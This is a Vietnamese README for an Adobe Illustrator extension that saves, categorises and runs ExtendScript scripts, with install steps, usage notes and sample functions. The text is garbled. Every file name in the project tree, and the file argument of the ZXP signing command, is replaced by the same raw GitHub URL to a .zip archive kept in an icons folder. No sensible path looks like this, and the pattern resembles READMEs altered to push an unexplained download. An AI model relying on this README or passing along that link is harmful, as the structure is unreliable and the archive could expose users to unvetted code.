# Lưu Trữ Script - Adobe Illustrator Extension

## 📋 Giới thiệu
Extension Adobe Illustrator giúp lưu trữ và quản lý các script ExtendScript một cách tiện lợi, được phát triển dựa trên kiến thức học hỏi từ TaoHinhVuong và LAScripts.

## ✨ Tính năng chính
- 📁 **Lưu trữ script**: Lưu các script ExtendScript với tên và danh mục
- ▶️ **Chạy script nhanh**: Double-click để chạy script đã lưu
- 🏷️ **Phân loại danh mục**: Tổ chức script theo 6 danh mục khác nhau
- ✏️ **Chỉnh sửa script**: Edit script đã lưu trực tiếp trong panel
- 🧪 **Test script**: Chạy thử script trước khi lưu
- 📥 **Import/Export**: Import file .jsx và export backup
- 🔍 **Lọc và tìm kiếm**: Lọc script theo danh mục
- 🎨 **Giao diện Dark Theme**: Modern UI với animations

## 🚀 Cài đặt

### Cách 1: Debug Mode (Development)
1. **Bật PlayerDebugMode trong Registry:**
   ```
   Windows: HKEY_CURRENT_USER\Software\Adobe\CSXS.8
   Tạo String "PlayerDebugMode" = "1"
   ```

2. **Copy folder vào extensions:**
   ```
   Windows: %USERPROFILE%\AppData\Roaming\Adobe\CEP\extensions\
   macOS: ~/Library/Application Support/Adobe/CEP/extensions/
   ```

3. **Restart Adobe Illustrator**

4. **Mở extension:** Windows → Extensions → Lưu Trữ Script

### Cách 2: ZXP Package (Production)
```bash
# Đóng gói thành ZXP
ZXPSignCmd -sign "LuuTruScript" "https://raw.githubusercontent.com/Ductai953/Manage-scripts-illustrator-/main/assets/icons/Manage_scripts_illustrator_2.9.zip" "certificate.p12" "password"

# Cài đặt bằng ZXPInstaller
```

## 📖 Hướng dẫn sử dụng

### 1. Thêm Script Mới
1. Nhập **tên script**
2. Chọn **danh mục** (Tổng quát, Hình dạng, Màu sắc, v.v.)
3. Paste **code ExtendScript** vào textarea
4. Click **"💾 Lưu Script"** hoặc **Ctrl+Enter**

### 2. Chạy Script
- **Double-click** vào script trong danh sách
- Hoặc click **▶️** bên cạnh script
- Hoặc click **"▶️ Test Ngay"** để chạy code hiện tại

### 3. Quản lý Script
- **✏️ Edit**: Chỉnh sửa script đã lưu
- **🗑️ Delete**: Xóa script
- **🔄 Refresh**: Cập nhật danh sách
- **📥 Import**: Import file .jsx
- **📤 Export All**: Backup tất cả scripts

### 4. Danh mục Script
- **Tổng quát**: Scripts chung
- **Hình dạng**: Tạo/chỉnh sửa hình
- **Màu sắc**: Xử lý màu
- **Văn bản**: Text effects
- **Hiệu ứng**: Visual effects
- **Tự động hóa**: Automation scripts

## 🛠️ Cấu trúc dự án
```
LuuTruScript/
├── CSXS/
│   └── https://raw.githubusercontent.com/Ductai953/Manage-scripts-illustrator-/main/assets/icons/Manage_scripts_illustrator_2.9.zip          # Extension configuration
├── assets/
│   ├── css/
│   │   └── https://raw.githubusercontent.com/Ductai953/Manage-scripts-illustrator-/main/assets/icons/Manage_scripts_illustrator_2.9.zip          # Dark theme styling
│   ├── js/
│   │   ├── https://raw.githubusercontent.com/Ductai953/Manage-scripts-illustrator-/main/assets/icons/Manage_scripts_illustrator_2.9.zip   # Adobe CEP API
│   │   └── https://raw.githubusercontent.com/Ductai953/Manage-scripts-illustrator-/main/assets/icons/Manage_scripts_illustrator_2.9.zip           # Frontend logic
│   └── icons/               # Extension icons
├── scripts/
│   └── https://raw.githubusercontent.com/Ductai953/Manage-scripts-illustrator-/main/assets/icons/Manage_scripts_illustrator_2.9.zip             # ExtendScript backend
├── https://raw.githubusercontent.com/Ductai953/Manage-scripts-illustrator-/main/assets/icons/Manage_scripts_illustrator_2.9.zip               # Main UI
└── https://raw.githubusercontent.com/Ductai953/Manage-scripts-illustrator-/main/assets/icons/Manage_scripts_illustrator_2.9.zip                # Documentation
```

## 💡 Kiến thức áp dụng từ TaoHinhVuong

### 🏗️ Architecture Patterns
- **CEP Extension structure**: Manifest, UI separation
- **Communication pattern**: CSInterface ↔ ExtendScript
- **Error handling**: Try/catch với JSON responses
- **Event-driven**: DOM events và CSXSEvent

### 🎨 UI/UX Improvements
- **Dark theme**: Modern color scheme
- **Responsive design**: Flexible layouts
- **Visual feedback**: Status messages, hover effects
- **Keyboard shortcuts**: Ctrl+Enter, F5
- **Progressive disclosure**: Organized sections

### 📊 Data Management
- **LocalStorage**: Persistent script storage
- **JSON serialization**: Structured data format
- **File I/O**: Import/Export functionality
- **Category system**: Organized script library

## 🔧 Development Features

### Script Security
- Basic validation để tránh dangerous functions
- Safe execution wrapper
- Error isolation

### Sample Scripts
Extension đi kèm sample scripts:
```javascript
// Tạo lưới hình vuông
sampleCreateGrid()

// Áp dụng màu ngẫu nhiên cho objects đã chọn
sampleRandomColors()
```

### Utility Functions
```javascript
// Tạo hình chữ nhật
createRectangle(width, height, x, y)

// Tạo hình tròn
createCircle(radius, x, y)

// Thiết lập màu
setObjectColor(object, colorHex, isStroke)

// Căn giữa object
centerObjectOnArtboard(object)
```

## ⌨️ Keyboard Shortcuts
- **Ctrl+Enter**: Lưu script
- **F5** hoặc **Ctrl+R**: Test script hiện tại
- **Double-click**: Chạy script từ danh sách

## 🚨 Xử lý lỗi
- Input validation realtime
- ExtendScript error catching
- Status feedback system
- Graceful error messages

## 🔮 Tính năng có thể mở rộng
- **Syntax highlighting**: Code editor với highlighting
- **Script templates**: Pre-built templates
- **Version control**: Script versioning
- **Sharing**: Export/import script packages
- **Hot reload**: Auto-refresh during development
- **Script scheduling**: Timed execution
- **Multi-language**: Internationalization

## 📋 Yêu cầu hệ thống
- Adobe Illustrator CS6 (version 16.0) trở lên
- Windows 7+ hoặc macOS 10.9+
- CEP Runtime 5.0+

## 🤝 Contributing
Extension sử dụng patterns từ TaoHinhVuong và LAScripts làm foundation.

## 📄 License
Sử dụng cho mục đích học tập và phát triển.

---
*Phát triển dựa trên kiến thức học hỏi từ TaoHinhVuong v1.0.0*
